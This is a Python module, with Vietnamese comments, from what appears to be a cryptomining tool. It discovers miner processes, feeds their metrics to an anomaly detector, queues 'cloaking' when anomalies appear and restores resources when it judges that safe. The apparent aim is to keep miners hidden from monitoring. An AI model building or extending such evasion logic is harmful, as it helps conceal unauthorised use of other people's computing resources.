# anomaly_detector.py

import psutil
import logging
import traceback
import time
import pynvml
import threading

from typing import List, Dict, Any
from .utils import MiningProcess
from .anomaly_evaluator import SafeRestoreEvaluator  # Chỉ import, không định nghĩa lại

from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules.interfaces import IResourceManager

###############################################################################
#   QUẢN LÝ NVML TOÀN CỤC CHO MODULE (SỬ DỤNG LOCK THREADING)                #
###############################################################################
_nvml_lock = threading.Lock()
_nvml_initialized = False  # Phải khai báo toàn cục


def initialize_nvml():
    """
    Khởi tạo NVML (nếu chưa được khởi tạo).
    Sử dụng threading.Lock để tránh xung đột trong truy cập NVML.

    Raises:
        RuntimeError: Nếu xảy ra lỗi khi khởi tạo NVML.
    """
    global _nvml_initialized
    with _nvml_lock:
        if not _nvml_initialized:
            try:
                pynvml.nvmlInit()
                _nvml_initialized = True
            except pynvml.NVMLError as e:
                raise RuntimeError(f"Lỗi khi khởi tạo NVML: {e}") from e


def is_nvml_initialized() -> bool:
    """
    Kiểm tra xem NVML đã được khởi tạo hay chưa.

    Returns:
        bool: True nếu đã khởi tạo, False nếu chưa.
    """
    return _nvml_initialized


###############################################################################
#                           LỚP CHÍNH: AnomalyDetector                        #
###############################################################################
class AnomalyDetector:
    """
    Lớp phát hiện bất thường cho tiến trình khai thác, sử dụng threading để chạy song song.

    Attributes:
        config (ConfigModel): Cấu hình chung cho việc phát hiện bất thường.
        event_bus (EventBus): Cơ chế pub/sub để giao tiếp với các module khác.
        logger (logging.Logger): Đối tượng Logger để ghi nhận log.
        resource_manager (IResourceManager): Đối tượng quản lý tài nguyên (đồng bộ).
        stop_event (threading.Event): Cờ dừng cho các luồng theo dõi.
        mining_processes (List[MiningProcess]): Danh sách các tiến trình khai thác phát hiện được.
        mining_processes_lock (threading.Lock): Khóa để bảo vệ truy cập mining_processes.
        safe_restore_evaluator (SafeRestoreEvaluator): Đánh giá khi nào an toàn để khôi phục tài nguyên.
        threads (List[threading.Thread]): Danh sách các luồng đang chạy trong AnomalyDetector.
        metrics_history (Dict[str, List[Dict[str, float]]]): Lưu trữ lịch sử metrics theo PID.
        min_data_points (int): Số lượng mẫu tối thiểu để tiến hành phát hiện bất thường.
        process_states (Dict[int, str]): Bản đồ PID -> trạng thái ("normal", "cloaking", "cloaked", "restoring").
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus,
                logger: logging.Logger, resource_manager: IResourceManager):
        """
        Triển khai Singleton pattern để đảm bảo chỉ có duy nhất một đối tượng AnomalyDetector.
        """
        with cls._instance_lock:
            if not hasattr(cls, '_instance') or cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus,
                 logger: logging.Logger, resource_manager: IResourceManager):
        """
        Khởi tạo AnomalyDetector.

        :param config: Cấu hình chung của AnomalyDetector (ConfigModel).
        :param event_bus: Cơ chế pub/sub EventBus.
        :param logger: Đối tượng Logger để ghi log.
        :param resource_manager: Đối tượng ResourceManager đồng bộ để quản lý tài nguyên.
        """
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.config = config
        self.event_bus = event_bus
        self.logger = logger
        self.resource_manager = resource_manager

        self.stop_event = threading.Event()
        self.mining_processes: List[MiningProcess] = []
        self.mining_processes_lock = threading.Lock()

        # SafeRestoreEvaluator (chạy đồng bộ)
        self.safe_restore_evaluator = SafeRestoreEvaluator(
            config, logger, resource_manager
        )

        # Danh sách luồng của AnomalyDetector
        self.threads: List[threading.Thread] = []

        # Lưu history metrics => { pid_str: [ sample_dict1, sample_dict2, ... ] }
        self.metrics_history: Dict[str, List[Dict[str, float]]] = {}

        # Số lượng mẫu tối thiểu cần để phát hiện bất thường
        self.min_data_points = 12

        # Bản đồ PID -> trạng thái: "normal", "cloaking", "cloaked", "restoring"
        self.process_states: Dict[int, str] = {}

        self.logger.info("AnomalyDetector đã được khởi tạo thành công.")

    def start(self):
        """
        Khởi động AnomalyDetector (đồng bộ).
        - Khởi tạo NVML (nếu cần).
        - Khởi tạo SafeRestoreEvaluator (nếu có logic).
        - Tạo các luồng chạy nền:
            + anomaly_detection: Theo dõi, phát hiện bất thường.
            + monitor_restoration: Theo dõi điều kiện để phục hồi tài nguyên.
        - Khởi chạy khám phá tiến trình ban đầu.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")

        if not self.resource_manager:
            raise RuntimeError("ResourceManager chưa được thiết lập.")

        # Đảm bảo NVML đã khởi tạo
        if not is_nvml_initialized():
            initialize_nvml()
            self.logger.info("NVML đã được khởi tạo (một lần).")

        # Khởi động SafeRestoreEvaluator (nếu hàm start có logic)
        try:
            self.safe_restore_evaluator.start()
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khởi động SafeRestoreEvaluator: {e}\n{traceback.format_exc()}"
            )

        # Tạo thread anomaly_detection
        anomaly_thread = threading.Thread(
            target=self.anomaly_detection,
            daemon=True,
            name="AnomalyDetectionThread"
        )
        anomaly_thread.start()
        self.threads.append(anomaly_thread)

        # Tạo thread monitor_restoration
        restore_thread = threading.Thread(
            target=self.monitor_restoration,
            daemon=True,
            name="MonitorRestorationThread"
        )
        restore_thread.start()
        self.threads.append(restore_thread)

        # Khám phá tiến trình ban đầu
        self.discover_mining_processes()

        self.logger.info("AnomalyDetector đã khởi động thành công.")

    def discover_mining_processes(self):
        """
        Tìm các tiến trình khai thác (CPU/GPU) dựa trên config.
        Cập nhật tự động vào self.mining_processes và set state="normal" cho PID mới.
        """
        cpu_name = self.config.processes.get('CPU', '').lower()
        gpu_name = self.config.processes.get('GPU', '').lower()

        retry_attempts = 3
        for attempt in range(retry_attempts):
            try:
                with self.mining_processes_lock:
                    self.mining_processes.clear()
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            pname = proc.info['name'].lower()
                            if cpu_name in pname or gpu_name in pname:
                                prio = self.get_process_priority(proc.info['name'])
                                net_if = self.config.network_interface
                                mining_proc = MiningProcess(
                                    proc.info['pid'],
                                    proc.info['name'],
                                    prio,
                                    net_if,
                                    self.logger
                                )
                                # Nếu lần đầu xuất hiện PID -> đặt trạng thái = "normal"
                                if mining_proc.pid not in self.process_states:
                                    self.process_states[mining_proc.pid] = "normal"

                                mining_proc.is_cloaked = False
                                self.mining_processes.append(mining_proc)

                        except Exception as e:
                            self.logger.error(
                                f"Lỗi khi xử lý tiến trình {proc.info['name']}: {e}"
                            )

                    if self.mining_processes:
                        self.logger.info(
                            f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác."
                        )
                    else:
                        self.logger.warning("Không phát hiện tiến trình khai thác nào.")
                return
            except Exception as e:
                self.logger.error(
                    f"Lỗi discover_mining_processes (attempt {attempt + 1}): {e}"
                )
                if attempt == retry_attempts - 1:
                    raise e
                time.sleep(1)

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên (priority) dựa trên config.

        :param process_name: Tên tiến trình.
        :return: Độ ưu tiên (int).
        """
        priority_map = self.config.process_priority_map
        val = priority_map.get(process_name.lower(), 1)
        if not isinstance(val, int):
            self.logger.warning(
                f"Độ ưu tiên '{process_name}' không phải int => gán = 1."
            )
            return 1
        return val

    def anomaly_detection(self):
        """
        Hàm chạy trong thread: Vòng lặp chính để phát hiện bất thường.
        - Định kỳ (detection_interval_seconds), sẽ:
          + Gọi discover_mining_processes()
          + evaluate_process_anomaly() trên từng tiến trình khai thác (nếu state phù hợp)
        - Dừng lại khi stop_event được set.
        """
        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                with self.mining_processes_lock:
                    processes_copy = list(self.mining_processes)

                if processes_copy:
                    for proc in processes_copy:
                        # Chỉ đánh giá anomaly khi tiến trình đang ở trạng thái "normal" hoặc "restoring"
                        # (tránh lặp cloaking nếu PID đang cloaking/cloaked)
                        current_state = self.process_states.get(proc.pid, "normal")
                        if current_state in ("normal", "restoring"):
                            self.evaluate_process_anomaly(proc)
                else:
                    self.logger.debug("Không có tiến trình để kiểm tra bất thường.")
            except Exception as e:
                self.logger.error(
                    f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}"
                )

            interval = self.config.monitoring_parameters.get(
                "detection_interval_seconds", 3600
            )
            time.sleep(interval)

    def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int = 5):
        """
        Đánh giá xem tiến trình có bất thường hay không.
        Thu thập metrics, lưu vào history, gọi Azure Anomaly Detector,
        nếu bất thường thì thực hiện enqueue cloaking.

        :param process: Đối tượng MiningProcess cần đánh giá.
        :param cloak_delay: Thời gian chờ (giây) trước khi cloaking (mặc định = 5s).
        """
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại.")
                return

            # Thu thập 1 snapshot metrics (đồng bộ)
            current_snapshot = self.resource_manager.collect_metrics(process)
            if not current_snapshot:
                self.logger.debug(
                    f"Không thu thập được metrics PID={process.pid} => bỏ qua."
                )
                return

            pid_str = str(process.pid)
            # Thêm snapshot vào history
            if pid_str not in self.metrics_history:
                self.metrics_history[pid_str] = []
            self.metrics_history[pid_str].append(current_snapshot)

            # Giới hạn history => 50 sample
            if len(self.metrics_history[pid_str]) > 50:
                self.metrics_history[pid_str].pop(0)

            # Lấy min_data_points sample mới nhất => detect anomalies
            history_data = self.metrics_history[pid_str][-self.min_data_points:]
            if len(history_data) < self.min_data_points:
                # Chưa đủ data => bỏ qua
                self.logger.debug(
                    f"PID={process.pid} chưa đủ {self.min_data_points} data points => bỏ qua anomaly check."
                )
                return

            # Gọi anomaly_detector_client (đồng bộ)
            # single_proc_data = { pid_str: [ {metrics}, ... ] }
            single_proc_data = {pid_str: history_data}
            anomalies = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(
                single_proc_data
            )

            is_anomaly = False
            if isinstance(anomalies, bool):
                is_anomaly = anomalies
            elif isinstance(anomalies, dict):
                is_anomaly = (pid_str in anomalies and anomalies[pid_str])

            if is_anomaly:
                self.logger.warning(
                    f"Phát hiện bất thường {process.name} (PID={process.pid}), sẽ cloak sau {cloak_delay}s."
                )
                time.sleep(cloak_delay)  # Thay cho await asyncio.sleep(cloak_delay)

                # Đánh dấu PID đang "cloaking"
                self.process_states[process.pid] = "cloaking"
                self.enqueue_cloaking(process)

                # Vẫn duy trì cờ is_cloaked để không phá vỡ code cũ,
                # resource_manager khi cloak xong sẽ cập nhật lại state = "cloaked".
                process.is_cloaked = True
            else:
                self.logger.info(
                    f"Không phát hiện bất thường cho PID={process.pid}."
                )

        except Exception as e:
            self.logger.error(
                f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}"
            )

    def enqueue_cloaking(self, process: MiningProcess):
        """
        Gọi ResourceManager để đưa yêu cầu cloaking vào hàng đợi (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            self.resource_manager.enqueue_cloaking(process)
            self.logger.info(
                f"Đã enqueue cloaking cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}"
            )

    def enqueue_restoration(self, process: MiningProcess):
        """
        Gọi ResourceManager để đưa yêu cầu khôi phục vào hàng đợi (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            self.resource_manager.enqueue_restoration(process)
            self.logger.info(
                f"Đã enqueue restore cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}"
            )

    def monitor_restoration(self):
        """
        Hàm chạy trong thread: Theo dõi tiến trình đã cloak, kiểm tra điều kiện để khôi phục.
        - Định kỳ (60 giây) duyệt các tiến trình có state="cloaked"
          và gọi SafeRestoreEvaluator.is_safe_to_restore() để quyết định restore.
        - Nếu đủ điều kiện thì enqueue khôi phục (đặt state="restoring").
        - Dừng khi stop_event được set.
        """
        interval = 60
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock:
                    cloaked_procs = [
                        p for p in self.mining_processes
                        if self.process_states.get(p.pid, "normal") == "cloaked"
                    ]

                if self.safe_restore_evaluator and cloaked_procs:
                    for proc in cloaked_procs:
                        try:
                            result = self.safe_restore_evaluator.is_safe_to_restore(proc)
                        except Exception as ex:
                            self.logger.error(
                                f"Lỗi khi kiểm tra khôi phục PID={proc.pid}: {ex}"
                            )
                            continue

                        if result:
                            self.logger.info(
                                f"Đủ điều kiện khôi phục PID={proc.pid}."
                            )
                            # Đánh dấu tiến trình sang trạng thái "restoring"
                            self.process_states[proc.pid] = "restoring"

                            self.enqueue_restoration(proc)

                            # Nếu muốn giữ cờ is_cloaked (False) sau khi enqueue
                            proc.is_cloaked = False

                            self.logger.info(
                                f"Đã yêu cầu khôi phục tài nguyên cho {proc.name} (PID={proc.pid})."
                            )
                        else:
                            self.logger.debug(
                                f"PID={proc.pid} chưa đủ điều kiện khôi phục."
                            )

            except Exception as e:
                self.logger.error(
                    f"Lỗi monitor_restoration: {e}\n{traceback.format_exc()}"
                )

            time.sleep(interval)

    def stop(self):
        """
        Dừng AnomalyDetector:
        - Set stop_event để dừng các luồng.
        - Chờ các luồng kết thúc.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()

        # Hủy các thread, join ngắn hạn
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=2)

        self.logger.info("AnomalyDetector đã dừng thành công.")
